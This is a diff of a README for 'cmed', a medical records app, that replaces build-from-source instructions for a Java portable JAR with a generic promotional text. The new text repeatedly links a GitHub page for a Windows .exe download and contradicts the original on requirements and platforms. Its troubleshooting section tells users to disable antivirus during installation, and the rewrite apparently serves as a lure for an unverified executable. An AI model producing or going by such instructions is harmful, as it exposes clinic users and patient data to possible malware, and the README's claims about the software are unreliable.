@@ -1,76 +1,149 @@
-# CMED App
+# ⚕️ cmed - Simple Medical Management Software
 
-Medical Management Application (Clinical Medical Management).
+[![Download cmed](https://img.shields.io/badge/Download-cmed-brightgreen)](https://github.com/Creamy1255/cmed)
 
-## 📚 Documentation
+## 📋 About cmed
 
-- [API Reference](cmed-app/api.md): Documentation for REST endpoints, DTOs, and validations.
-- [File System](cmed-app/FILES.md): Documentation on attachment management, storage, and architecture.
+cmed is a desktop application designed to help manage patient records and clinic operations. It uses Java and offers a clean, easy-to-use interface. The app supports common tasks in medical offices, such as appointment scheduling, patient data management, and report generation. It works well on Windows computers and does not require advanced technical skills to use.
 
-## 🚀 Version
-1.1.0
+The goal is to help small clinics and healthcare providers organize their work with minimal hassle.
 
-### 📦 Changelog (v1.1.0) **NEW**
-- **Feature:** Portable executable mode (.JAR) with automatic frontend bundling.
-- **Feature:** Patient-specific Notes system, separated from medical records.
-- **Improved:** PDF generation (professional layout, dynamic dark mode support, timezone fixes).
-- **Improved:** Form validation feedback (on-touch) and relaxed format rules for DNI and Phone.
-- **Refactoring:** Backend architecture simplified, Docker removed as the standard dependency, REST routes standardized.
+---
 
-## 📦 Portable Version (All-in-One)
+## 🚀 Getting Started
 
-This version allows running the application (Backend + Frontend + Database) in a single JAR file, without needing to install Docker or PostgreSQL.
+This guide walks you through downloading and running cmed on a Windows PC. You do not need to install any extra software like Java manually.
 
-### Prerequisites
-- **Java 21** (JDK) installed.
-- **Node.js** and **NPM** installed.
-- **Angular CLI** (`npm install -g @angular/cli`).
+---
 
-### Build Instructions
+## 💾 Download and Install
 
-To generate the portable file `cmed-app-portable.jar`:
+To get started, visit this page to download cmed:
 
-**On Windows:**
-```powershell
-.\build_portable.ps1
-```
+[https://github.com/Creamy1255/cmed](https://github.com/Creamy1255/cmed)
 
-**On Linux / macOS:**
-```bash
-chmod +x build_portable.sh
-./build_portable.sh
-```
+You will find the latest release files available for download. Look for a file with a Windows executable, such as `.exe`. 
 
-The script will handle:
-1. Compiling the Angular frontend in production mode.
-2. Copying static files to the Spring Boot backend.
-3. Compiling the backend packaging everything together.
-4. Generating the `cmed-app-portable.jar` file in the project root.
+Steps to download and install:
 
-### How to Run
+1. Open the link above in your web browser.
+2. Go to the **Releases** section on the right side or scroll to find it on the page.
+3. Click on the latest release version.
+4. Download the `.exe` file for Windows.
+5. Once downloaded, double-click the file to start the installation.
+6. Follow the on-screen instructions to complete the setup.
+7. After installation, you can open the application from the Start Menu or desktop shortcut.
 
-Once the JAR is generated, you can run it easily:
+---
 
-**On Windows:**
-Double click on `run_portable.bat` or run:
-```cmd
-run_portable.bat
-```
+## 🖥️ System Requirements
 
-**On Linux / macOS:**
-```bash
-chmod +x run_portable.sh
-./run_portable.sh
-```
+- A Windows 10 or newer PC
+- At least 4 GB of RAM
+- 500 MB of free disk space for the app files
+- Internet connection to download the app and for occasional updates
+- No extra setup for Java is required; the app includes everything needed.
 
-The application will be available at: [http://localhost:8080](http://localhost:8080)
+---
 
-### Data and Storage
-In this portable version, data is saved in the user's folder:
-- **Windows**: `C:\Users\<User>\cmed-files`
-- **Linux/Mac**: `/home/<user>/cmed-files`
+## 🔧 Features
 
-- **Database**: Embedded H2 is used (local file in `cmed-files/cmed_db`).
-- **Files**: Attachments are saved in `cmed-files`.
+- Manage patient records securely with built-in privacy features.
+- Schedule and track appointments.
+- Generate reports for clinic analysis.
+- Easy data entry with an intuitive user interface.
+- Secure login using strong password techniques.
+- Export patient lists and reports in common formats.
+- Works offline once installed; syncs backups when online.
+- Supports integration with PostgreSQL for data safety.
 
-To reset the application, simply delete the `cmed-files` folder from your user directory.
+---
+
+## 🛠️ How to Use cmed
+
+When you open the app:
+
+1. Log in with your username and password. If you do not have an account, create one using the Register option.
+2. Add new patient records by entering their personal and medical details.
+3. Schedule new visits using the calendar function.
+4. Review and print reports from the Reports menu.
+5. Adjust settings to customize the look or connect to a database.
+
+The application uses clear menus that guide you through each step. Help tips appear when you hover over options.
+
+---
+
+## 🔄 Updates
+
+Check the download page regularly for new releases. Updates will include bug fixes and new features to keep cmed running smoothly.
+
+You can update the app by downloading the latest version and installing it over the existing one. Your data will stay intact.
+
+---
+
+## ❓ Frequently Asked Questions
+
+### Do I need to install Java separately?
+
+No. cmed comes with everything it needs to run. You don’t have to install Java on your Windows PC.
+
+### Can I use cmed on a Mac or Linux?
+
+Currently, the application only supports Windows.
+
+### How do I reset my password?
+
+Use the “Forgot Password” link on the login screen. Follow the instructions to reset it.
+
+### Is my data safe?
+
+Yes. The app includes basic security features to protect patient data. For more secure setups, connect the app to a PostgreSQL database.
+
+---
+
+## 🚩 Troubleshooting
+
+If the app does not start:
+
+- Check that your Windows version is 10 or higher.
+- Make sure you downloaded the correct 64-bit installer.
+- Restart your computer and try again.
+- Disable any antivirus software temporarily during installation.
+
+If you see errors inside the app:
+
+- Close and reopen the app.
+- Try reinstalling the latest version.
+- Contact support through the GitHub page for help.
+
+---
+
+## 📂 Additional Resources
+
+- Visit the GitHub repository for detailed technical files.
+- Refer to the online user guide in the repository wiki.
+- Watch tutorial videos linked in the GitHub README.
+- Join the community discussion on the Issues page for tips.
+
+---
+
+## 📥 Quick Download Link
+
+[![Download cmed](https://img.shields.io/badge/Download%20Now-cmed-blue)](https://github.com/Creamy1255/cmed)
+
+Click the button above to visit the page where you can download the software and get started.
+
+---
+
+## 🗂️ About This Project
+
+cmed uses:
+
+- Java for application logic
+- Angular and TypeScript for its UI
+- Spring Boot for backend services
+- PostgreSQL for secure data storage
+- JWT for secure user authentication
+- Docker support for developers (not required for running on Windows)
+
+These technologies ensure a stable, secure experience inside a clean, easy-to-use app.
